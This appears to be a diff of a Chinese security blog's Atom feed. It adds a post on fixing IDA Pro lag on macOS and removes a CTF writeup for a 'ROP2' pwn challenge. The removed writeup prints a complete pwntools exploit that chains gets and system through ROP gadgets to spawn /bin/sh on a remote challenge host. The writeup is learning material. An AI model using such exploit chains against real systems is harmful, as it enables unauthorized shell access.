@@ -39,6 +39,32 @@
   </entry>
   
   <entry>
+    <title>MacOS IDA pro-致最傻的我 </title>
+    <link href="https://bufsnake.github.io/MacOS-IDA-pro-%E8%87%B4%E6%9C%80%E5%82%BB%E7%9A%84%E6%88%91.html"/>
+    <id>https://bufsnake.github.io/MacOS-IDA-pro-致最傻的我.html</id>
+    <published>2019-09-30T13:04:55.000Z</published>
+    <updated>2019-09-30T13:25:11.301Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才知道是个啥情况，这里简单记录一下。</p></blockquote><h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><p><img src="/images/pasted-145.png" alt="upload successful"></p><blockquote><p>第一次遇到文件权限后门带@的，以为是这个问题，然后就疯狂Google，才得知这是Mac OS X文件系统的附加属性</p></blockquote><blockquote><p>文件的读写权限中被加上了一个@符号，这就是 Mac OS X 文件系统的附加属性（extended attributes）</p></blockquote><blockquote><p>这个属性下，打开文件显示错误为：项目“XXX”已被OS X 使用，不能打开</p></blockquote><h4 id="xattr"><a href="#xattr" class="headerlink" title="xattr"></a>xattr</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xattr -c filename <span class="comment"># 可以清除这个附加属性</span></span><br></pre></td></tr></table></figure><blockquote><p>天真的以为清除附加属性后，打开就没有问题了，然而，我错了。还是没能解决</p></blockquote><h3 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h3><p><img src="/images/pasted-146.png" alt="upload successful"></p><p><img src="/images/pasted-147.png" alt="upload successful"></p><blockquote><p>出现签名的问题，然后又是一番疯狂Google</p></blockquote><p><img src="/images/pasted-148.png" alt="upload successful"></p><blockquote><p>允许应用控制电脑，所以每次打开应用Mac OS X都会检测程序的签名问题。可能是因为我的IDA补丁的问题。</p></blockquote><p><img src="/images/pasted-149.png" alt="upload successful"></p><blockquote><p>取消勾选 允许应用控制电脑 即可解决问题。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>困扰了有两个月了，搞得我都对那个程序有些恐惧，都不想打开它，今天终于解决了。学到姿势了。</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才
+      
+    
+    </summary>
+    
+      <category term="misc" scheme="https://bufsnake.github.io/categories/misc/"/>
+    
+    
+      <category term="MacOS IDA" scheme="https://bufsnake.github.io/tags/MacOS-IDA/"/>
+    
+  </entry>
+  
+  <entry>
     <title>PHPStudy后门研究</title>
     <link href="https://bufsnake.github.io/PHPStudy%E5%90%8E%E9%97%A8%E7%A0%94%E7%A9%B6.html"/>
     <id>https://bufsnake.github.io/PHPStudy后门研究.html</id>
@@ -528,38 +554,6 @@
       <category term="heap" scheme="https://bufsnake.github.io/tags/heap/"/>
     
       <category term="pwn" scheme="https://bufsnake.github.io/tags/pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PWN 学习—某平台ROP2 writeup</title>
-    <link href="https://bufsnake.github.io/PWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html"/>
-    <id>https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup.html</id>
-    <published>2019-08-02T09:16:46.000Z</published>
-    <updated>2019-08-10T05:52:08.144Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="64位栈帧学习"><a href="#64位栈帧学习" class="headerlink" title="64位栈帧学习"></a>64位栈帧学习</h3><p><img src="/images/1/1.png" alt="在这里插入图片描述"></p><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h4 id="本能反应"><a href="#本能反应" class="headerlink" title="本能反应"></a>本能反应</h4><p><img src="/images/1/2.png" alt="在这里插入图片描述"></p><blockquote><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表<br>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br>NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br>PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p></blockquote><h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p><img src="/images/1/3.png" alt="在这里插入图片描述"></p><blockquote><p>发现输入一定的长度，程序就崩溃了</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><p><img src="/images/1/4.png" alt="在这里插入图片描述"></p><blockquote><p>查看要程序逻辑<br>发现存在栈溢出漏洞<br>输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了</p></blockquote><h5 id="查看函数表"><a href="#查看函数表" class="headerlink" title="查看函数表"></a>查看函数表</h5><p><img src="/images/1/5.png" alt="在这里插入图片描述"></p><h5 id="发现函数joke"><a href="#发现函数joke" class="headerlink" title="发现函数joke"></a>发现函数joke</h5><p><img src="/images/1/6.png" alt="在这里插入图片描述"></p><blockquote><p>似乎用不到的函数</p></blockquote><h5 id="接下来查看字符串"><a href="#接下来查看字符串" class="headerlink" title="接下来查看字符串"></a>接下来查看字符串</h5><p><img src="/images/1/7.png" alt="在这里插入图片描述"></p><blockquote><p>我无敌的/bin/sh字符串竟然没有，还好有gets和system函数</p></blockquote><h5 id="思考利用方法"><a href="#思考利用方法" class="headerlink" title="思考利用方法"></a>思考利用方法</h5><blockquote><p>调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”);</p></blockquote><h5 id="实操过程"><a href="#实操过程" class="headerlink" title="实操过程"></a>实操过程</h5><p><img src="/images/1/8.png" alt="在这里插入图片描述"></p><blockquote><p>这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数<br>pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中<br>所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)<br>程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数</p></blockquote><pre><code>接下来时调用system函数</code></pre><blockquote><p>我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方<br>我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，<br>gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用</p></blockquote><h5 id="此时栈空间如图"><a href="#此时栈空间如图" class="headerlink" title="此时栈空间如图"></a>此时栈空间如图</h5><p><img src="/images/1/9.png" alt="在这里插入图片描述"></p><h5 id="附上payload"><a href="#附上payload" class="headerlink" title="附上payload"></a>附上payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = remote(<span class="string">"ip"</span>,port)</span><br><span class="line">pros = ELF(<span class="string">'./rop2'</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6010F0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line"></span><br><span class="line">system_addr = pros.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = pros.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> +<span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)</span><br><span class="line">pro.readuntil(<span class="string">"~"</span>)</span><br><span class="line">pro.sendline(payload)</span><br><span class="line">pro.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/1/10.png" alt="在这里插入图片描述"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><pre><code>&gt; PWN 学习之路永无止境</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;64位栈帧学习&quot;&gt;&lt;a href=&quot;#64位栈帧学习&quot; class=&quot;headerlink&quot; title=&quot;64位栈帧学习&quot;&gt;&lt;/a&gt;64位栈帧学习&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/1/1.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;
-&lt;h
-      
-    
-    </summary>
-    
-      <category term="pwn" scheme="https://bufsnake.github.io/categories/pwn/"/>
-    
-    
-      <category term="pwn" scheme="https://bufsnake.github.io/tags/pwn/"/>
-    
-      <category term="writeup" scheme="https://bufsnake.github.io/tags/writeup/"/>
-    
-      <category term="pwntools" scheme="https://bufsnake.github.io/tags/pwntools/"/>
-    
-      <category term="rop" scheme="https://bufsnake.github.io/tags/rop/"/>
     
   </entry>
   
